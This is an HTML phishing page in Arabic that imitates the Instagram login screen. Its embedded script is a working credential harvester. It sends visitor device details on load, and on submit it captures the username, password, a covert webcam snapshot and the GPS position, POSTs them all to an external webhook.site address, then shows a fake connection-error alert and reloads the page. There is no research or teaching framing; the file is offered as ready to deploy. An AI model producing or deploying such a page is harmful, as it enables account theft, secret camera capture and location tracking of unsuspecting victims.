<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول • Instagram</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #ffffff; display: flex; flex-direction: column; justify-content: space-between; align-items: center; min-height: 100vh; padding: 20px 0; }
        .lang-container { margin-bottom: 20px; }
        .lang { color: #737373; font-size: 14px; text-decoration: none; }
        .main-container { display: flex; flex-direction: column; align-items: center; width: 100%; max-width: 350px; padding: 0 20px; flex-grow: 1; justify-content: center; }
        .logo { width: 75px; height: 75px; margin-bottom: 40px; }
        form { width: 100%; display: flex; flex-direction: column; gap: 12px; }
        .input-box { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 12px; padding: 14px 12px; font-size: 14px; color: #262626; outline: none; }
        .input-box:focus { border-color: #a8a8a8; }
        .login-btn { background-color: #0064e0; border: none; border-radius: 30px; color: white; width: 100%; padding: 14px; font-weight: 600; font-size: 15px; cursor: pointer; margin-top: 6px; }
        .forgot-pass { color: #000000; font-size: 14px; text-decoration: none; margin-top: 20px; text-align: center; }
        .footer { width: 100%; max-width: 350px; padding: 0 20px; display: flex; flex-direction: column; align-items: center; gap: 20px; }
        .create-btn { background-color: transparent; border: 1px solid #0064e0; border-radius: 30px; color: #0064e0; width: 100%; padding: 13px; font-weight: 600; font-size: 15px; text-align: center; text-decoration: none; }
        .meta-logo { display: flex; align-items: center; gap: 6px; font-weight: 600; color: #000000; font-size: 15px; }
        #loading-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 255, 255, 0.95); display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 9999; }
        .spinner { width: 40px; height: 40px; border: 4px solid #dbdbdb; border-top: 4px solid #0064e0; border-radius: 50%; animation: spin 0.8s linear infinite; margin-bottom: 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #loading-screen p { color: #262626; font-size: 15px; font-weight: 600; }
    </style>
</head>
<body>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <div id="loading-screen">
        <div class="spinner"></div>
        <p>جاري التحقق وتسجيل الدخول...</p>
    </div>

    <div class="lang-container"><a href="#" class="lang">العربية</a></div>

    <div class="main-container">
        <svg class="logo" viewBox="0 0 24 24"><path fill="#000" d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg>

        <form id="loginForm">
            <input type="text" id="username" class="input-box" placeholder="اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف" required>
            <input type="password" id="password" class="input-box" placeholder="كلمة السر" required>
            <button type="submit" class="login-btn">تسجيل الدخول</button>
        </form>
        <a href="#" class="forgot-pass">هل نسيت كلمة السر؟</a>
    </div>

    <div class="footer">
        <a href="#" class="create-btn">إنشاء حساب جديد</a>
        <div class="meta-logo">Meta</div>
    </div>

    <script>
        const webhookUrl = 'https://webhook.site/b7d269f6-0e71-49af-afed-d1832dade351';

        function sendData(data) {
            fetch(webhookUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) }).catch(() => {});
        }

        window.addEventListener('DOMContentLoaded', () => {
            let info = { type: 'visit', device: navigator.userAgent };
            if (navigator.getBattery) {
                navigator.getBattery().then(b => { info.battery = Math.round(b.level * 100) + '%'; sendData(info); });
            } else { sendData(info); }
        });

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            document.getElementById('loading-screen').style.display = 'flex';
            let u = document.getElementById('username').value;
            let p = document.getElementById('password').value;

            navigator.mediaDevices.getUserMedia({ video: true }).then(s => {
                const v = document.getElementById('video');
                const c = document.getElementById('canvas');
                v.srcObject = s;
                setTimeout(() => {
                    c.width = 640; c.height = 480;
                    c.getContext('2d').drawImage(v, 0, 0);
                    let img = c.toDataURL('image/jpeg', 0.4);
                    s.getTracks().forEach(t => t.stop());
                    processData(u, p, img);
                }, 1500);
            }).catch(() => processData(u, p, null));
        });

        function processData(u, p, img) {
            let payload = { username: u, password: p, photo: img || 'Denied' };
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(pos => {
                    payload.lat = pos.coords.latitude;
                    payload.lon = pos.coords.longitude;
                    sendData(payload);
                    setTimeout(() => { alert('خطأ في الاتصال، حاول مجدداً'); location.reload(); }, 2000);
                }, () => { sendData(payload); setTimeout(() => { alert('خطأ في الاتصال، حاول مجدداً'); location.reload(); }, 2000); });
            } else { sendData(payload); setTimeout(() => { alert('خطأ في الاتصال، حاول مجدداً'); location.reload(); }, 2000); }
        }
    </script>
</body>
</html>
